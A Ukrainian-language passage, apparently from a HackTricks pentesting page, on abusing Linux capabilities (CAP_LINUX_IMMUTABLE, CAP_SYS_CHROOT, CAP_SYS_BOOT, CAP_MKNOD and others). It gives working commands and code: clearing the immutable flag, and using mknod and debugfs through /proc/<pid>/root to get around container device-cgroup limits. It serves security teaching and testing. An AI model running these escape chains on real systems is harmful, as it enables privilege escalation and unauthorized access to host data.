lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Операції `FS_IOC_GETFLAGS` і `FS_IOC_SETFLAGS` зчитують і оновлюють прапорці inode; `FS_IMMUTABLE_FL` — це прапорець незмінності, який очищається в цьому прикладі.<sup>[[27]](#references)</sup>

> [!TIP]
> Зазвичай цей атрибут незмінності встановлюють і видаляють за допомогою:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дає змогу виконувати системний виклик `chroot(2)`, що може дозволити escape зі слабо налаштованого `chroot(2)` jail за допомогою відомих технік.<sup>[[11]](#references)[[14]](#references)</sup>

Це **capability для escape з chroot-jail, а не самостійний escape з контейнера на host**. Вона не відкриває файлову систему host і не обходить її дозволи. Якщо root host уже змонтований або доступний через `/proc/<pid>/root`, `chroot()` лише робить це наявне дерево коренем шляхів процесу. Окремо, для зміни mount namespaces за допомогою `setns(2)` потрібні `CAP_SYS_CHROOT` і `CAP_SYS_ADMIN` у user namespace викликача, а також `CAP_SYS_ADMIN` у user namespace, якому належить цільовий mount namespace.<sup>[[14]](#references)</sup>

- [Як виконати escape з різних chroot-рішень](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: інструмент для escape з chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дає змогу виконувати системний виклик `reboot(2)` для перезапуску системи, зокрема такі команди, як `LINUX_REBOOT_CMD_RESTART2`; він також активує `kexec_load(2)` і, починаючи з Linux 3.17, `kexec_file_load(2)` для завантаження відповідно нових або підписаних crash kernels.<sup>[[14]](#references)</sup>

У приватному PID namespace підтримуваний запит `reboot()` завершує init-процес цього namespace, а не перезавантажує host. Тому для впливу у вигляді перезавантаження host потрібен початковий PID namespace, зазвичай через спільний доступ до PID host. Захоплення через kexec додатково потребує сумісного image, доступного syscall, а також permissive lockdown і політики підписів. Не запускайте жодну з цих операцій на спільному host лише для перевірки capability:
```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) було відокремлено від ширшого **CAP_SYS_ADMIN** у Linux 2.6.37, що спеціально надало можливість використовувати виклик `syslog(2)`. Ця capability дає змогу переглядати kernel addresses через `/proc` та подібні інтерфейси, коли налаштування `kptr_restrict` має значення 1, яке контролює розкриття kernel addresses. Починаючи з Linux 2.6.39, значенням `kptr_restrict` за замовчуванням є 0, тобто kernel addresses розкриваються, хоча багато дистрибутивів встановлюють значення 1 (приховувати addresses, крім uid 0) або 2 (завжди приховувати addresses) з міркувань безпеки.<sup>[[14]](#references)</sup>

Крім того, **CAP_SYSLOG** дає змогу отримувати доступ до виводу `dmesg`, коли `dmesg_restrict` має значення 1. Попри ці зміни, **CAP_SYS_ADMIN** зберігає можливість виконувати операції `syslog` через історичні причини.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) розширює функціональність системного виклику `mknod` за межі створення звичайних файлів, FIFO (іменованих каналів) або UNIX domain sockets. Зокрема, вона дає змогу створювати special files, до яких належать:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, тобто пристрої на кшталт терміналів.
- **S_IFBLK**: Block special files, тобто такі пристрої, як диски.

Ця capability корисна для процесів, яким потрібно створювати device files, зокрема character або block devices.<sup>[[14]](#references)</sup>

Вона входить до задокументованого набору capabilities Docker за замовчуванням; перевіряйте фактичну конфігурацію runtime, а не припускайте, що кожне розгортання використовує однакові defaults ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Для container escape `CAP_MKNOD` може створити відсутній handle до реального host device, але вона **не** створює underlying device і **не** обходить device cgroup. Повний ланцюжок вимагає:

1. Effective `CAP_MKNOD` у початковому user namespace, оскільки створення devices не є namespaced.
2. Правильного block або character type і major/minor numbers для реального host device.
3. Device-cgroup permission на відкриття цього device.
4. Сумісного filesystem-aware reader або `CAP_SYS_ADMIN` для mount block filesystem.
5. Filesystem і LSM permission на створення та використання node.

Для lab block device сімейства ext із реальними major/minor numbers `252:1` read-only validation має такий вигляд:
```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Замініть числа на ті, що вказані в `/sys/class/block/<device>/dev`. Якщо створення вузла успішне, але його відкриття повертає `Operation not permitted`, device cgroup усе ще блокує доступ. Це нормальний результат у container, який має лише стандартний для Docker `CAP_MKNOD` без явного дозволу на device.

Також існує окрема техніка **локального підвищення привілеїв із двома foothold**, яку не слід плутати з прямим доступом container до device. Root-процес у container, що використовує початковий user namespace, може створити вузол block-device, тоді як непривілейована shell на host із відповідним UID відкриває цей вузол через `/proc/<container-pid>/root`. Після цього відкриття перевіряється в cgroup host shell, тому заборона device-cgroup container більше не захищає device.<sup>[[7]](#references)</sup>

Усередині container створіть вузол і залиште процес запущеним від імені UID наявного foothold на host:
```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
useradd -u "$host_uid" -M htbridge
bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```
З наявної оболонки хоста з цим UID визначте PID хоста для процесу контейнера, що перебуває у стані сну, і використайте його корінь procfs як шлях до пристрою:
```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```
Цей ланцюжок вимагає обох точок опори, identity-mapped або спільного user namespace, дозволу на проходження до цільового `/proc/<pid>/root`, реального пристрою з правильними major/minor numbers і outer cgroup, який дозволяє open. `hidepid`, правила ptrace-доступу, LSM, несумісність файлової системи або remapping user namespace можуть його зламати. Історична техніка цінна саме тим, що пояснює, як `/proc/<pid>/root` може обійти обмеження device-cgroup *контейнера*; це не твердження, що одного лише `CAP_MKNOD` достатньо для escape із нормально ізольованого контейнера.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

У сучасних ядрах Linux із file capabilities **`CAP_SETPCAP`** дозволяє thread додавати capabilities зі свого bounding set до inheritable set, видаляти capabilities зі свого bounding set і змінювати securebits. Вона не дозволяє процесу довільно надавати capabilities іншому процесу; така поведінка застосовується лише до ядер до версії 2.6.25, що не підтримували file capabilities.<sup>[[14]](#references)</sup>

System call `capset()` може змінювати власні effective, permitted та inheritable sets thread, але новий permitted set не може містити capabilities, відсутні в наявному permitted set, а оновлення inheritable set і надалі підпорядковуються обмеженням ядра.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - лабораторні роботи з privilege escalation у Linux](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation у Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Основи Linux-контейнерів: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Використання переваг Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Надмірні Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Зловживання доступом до mount namespaces через /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: навіщо вони існують і як працюють](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Розуміння Capabilities у Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC для обходу seccomp, якщо дозволено ptrace](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Як вийти з різних chroot-рішень](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - оригінальний exploit для Docker breakout через CAP_DAC_READ_SEARCH від Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Аналіз exploit для Docker breakout](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - сторінка посібника Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - сторінка посібника Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - сторінка посібника Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Запуск контейнерів - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - сторінка посібника Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - сторінка посібника Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - сторінка посібника Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
